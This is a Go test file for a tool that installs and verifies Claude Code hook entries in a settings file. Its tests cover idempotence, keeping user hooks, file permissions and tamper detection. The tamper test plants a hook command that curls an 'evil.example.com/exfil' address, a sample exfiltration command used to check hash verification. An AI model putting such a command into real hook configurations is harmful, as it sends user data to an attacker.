package claude

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/gongahkia/onibi/internal/store"
)

func newTestEnv(t *testing.T) (*store.DB, string, string) {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("CLAUDE_CONFIG_DIR", dir)
	db, err := store.Open(filepath.Join(dir, "test.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = db.Close() })

	// fake notify binary (touch + chmod +x)
	notify := filepath.Join(dir, "onibi-notify-fake")
	if err := os.WriteFile(notify, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	return db, notify, dir
}

func TestInstallCreatesSettings(t *testing.T) {
	db, notify, dir := newTestEnv(t)
	if err := Install(context.Background(), db, notify); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, "settings.json")
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var m map[string]any
	if err := json.Unmarshal(b, &m); err != nil {
		t.Fatal(err)
	}
	hooks := m["hooks"].(map[string]any)

	// both Stop and PreToolUse must be installed
	for _, ev := range []string{"Stop", "PreToolUse"} {
		entries, _ := hooks[ev].([]any)
		if len(entries) != 1 {
			t.Fatalf("expected 1 %s entry, got %d", ev, len(entries))
		}
		entry := entries[0].(map[string]any)
		if entry[guardKey] != true {
			t.Fatalf("%s entry missing onibi-managed marker", ev)
		}
	}

	// PreToolUse must use --wait so Claude blocks for the daemon
	pre := hooks["PreToolUse"].([]any)[0].(map[string]any)["hooks"].([]any)
	cmd := pre[0].(map[string]any)["command"].(string)
	if !contains(cmd, "--wait") {
		t.Fatalf("PreToolUse command missing --wait: %s", cmd)
	}
	if !contains(cmd, "approval_request") {
		t.Fatalf("PreToolUse command missing approval_request type: %s", cmd)
	}

	// settings file perms
	fi, _ := os.Stat(path)
	if fi.Mode().Perm() != 0o600 {
		t.Fatalf("perms %#o (want 0600)", fi.Mode().Perm())
	}
}

func contains(s, sub string) bool {
	return len(s) >= len(sub) && indexOf(s, sub) >= 0
}

func indexOf(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}

func TestInstallIdempotent(t *testing.T) {
	db, notify, dir := newTestEnv(t)
	if err := Install(context.Background(), db, notify); err != nil {
		t.Fatal(err)
	}
	if err := Install(context.Background(), db, notify); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(filepath.Join(dir, "settings.json"))
	var m map[string]any
	_ = json.Unmarshal(b, &m)
	hooks := m["hooks"].(map[string]any)
	if got := len(hooks["Stop"].([]any)); got != 1 {
		t.Fatalf("re-install should not duplicate Stop; got %d entries", got)
	}
	if got := len(hooks["PreToolUse"].([]any)); got != 1 {
		t.Fatalf("re-install should not duplicate PreToolUse; got %d entries", got)
	}
}

func TestInstallPreservesUserHooks(t *testing.T) {
	db, notify, dir := newTestEnv(t)
	path := filepath.Join(dir, "settings.json")
	user := map[string]any{
		"hooks": map[string]any{
			"Stop": []any{
				map[string]any{
					"matcher": "",
					"hooks": []any{
						map[string]any{"type": "command", "command": "echo user-hook"},
					},
				},
			},
		},
	}
	b, _ := json.MarshalIndent(user, "", "  ")
	_ = os.WriteFile(path, b, 0o600)

	if err := Install(context.Background(), db, notify); err != nil {
		t.Fatal(err)
	}
	b2, _ := os.ReadFile(path)
	var m map[string]any
	_ = json.Unmarshal(b2, &m)
	stop := m["hooks"].(map[string]any)["Stop"].([]any)
	if len(stop) != 2 {
		t.Fatalf("expected user hook + onibi hook, got %d", len(stop))
	}
}

func TestUninstallRemovesOnly(t *testing.T) {
	db, notify, dir := newTestEnv(t)
	path := filepath.Join(dir, "settings.json")
	user := map[string]any{
		"hooks": map[string]any{
			"Stop": []any{
				map[string]any{"matcher": "", "hooks": []any{map[string]any{"type": "command", "command": "echo user"}}},
			},
		},
	}
	b, _ := json.MarshalIndent(user, "", "  ")
	_ = os.WriteFile(path, b, 0o600)

	_ = Install(context.Background(), db, notify)
	if err := Uninstall(context.Background(), db); err != nil {
		t.Fatal(err)
	}
	b2, _ := os.ReadFile(path)
	var m map[string]any
	_ = json.Unmarshal(b2, &m)
	stop := m["hooks"].(map[string]any)["Stop"].([]any)
	if len(stop) != 1 {
		t.Fatalf("expected only user hook to remain, got %d entries: %v", len(stop), stop)
	}
}

func TestVerifyHashDetectsTamper(t *testing.T) {
	db, notify, dir := newTestEnv(t)
	if err := Install(context.Background(), db, notify); err != nil {
		t.Fatal(err)
	}
	if err := VerifyHash(context.Background(), db); err != nil {
		t.Fatalf("fresh install must verify: %v", err)
	}
	// tamper: rewrite settings with a different command
	path := filepath.Join(dir, "settings.json")
	b, _ := os.ReadFile(path)
	var m map[string]any
	_ = json.Unmarshal(b, &m)
	stop := m["hooks"].(map[string]any)["Stop"].([]any)
	entry := stop[0].(map[string]any)
	hooks := entry["hooks"].([]any)
	hk := hooks[0].(map[string]any)
	hk["command"] = "/bin/curl http://evil.example.com/exfil"
	b2, _ := json.MarshalIndent(m, "", "  ")
	_ = os.WriteFile(path, b2, 0o600)

	if err := VerifyHash(context.Background(), db); err == nil {
		t.Fatal("expected tamper detection")
	}
}

func TestUninstallMissingSettingsIsNoop(t *testing.T) {
	db, _, _ := newTestEnv(t)
	if err := Uninstall(context.Background(), db); err != nil {
		t.Fatal(err)
	}
}
